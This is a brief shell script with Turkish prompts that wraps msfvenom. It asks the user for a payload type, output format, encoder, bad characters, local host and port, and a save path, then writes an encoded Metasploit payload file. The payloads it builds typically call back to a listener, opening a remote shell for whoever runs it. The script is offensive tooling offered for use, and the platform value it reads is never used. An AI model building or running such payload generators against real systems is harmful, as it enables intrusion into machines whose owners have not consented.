#!/bin/sh
yesil='\033[92m'
echo -n "$yesil Payload Giriniz > "
read payload
echo -n "$yesil Format Giriniz > "
read format
echo -n "$yesil Encoder Giriniz > "
read encoder
echo -n "$yesil Platform Giriniz > "
read platform
echo -n "$yesil Shell Kod Giriniz (bad char) > "
read shellkod
echo -n "$yesil Yerel Ağ Adresi Giriniz > "
read lhost
echo -n "$yesil Yerel Port Giriniz > "
read lport
echo -n "$yesil Payload Kayıt Dizini Giriniz > "
read dizin
msfvenom -p $payload -f $format -e $encoder -b $shellkod lhost=$lhost lport=$lport R > $dizin
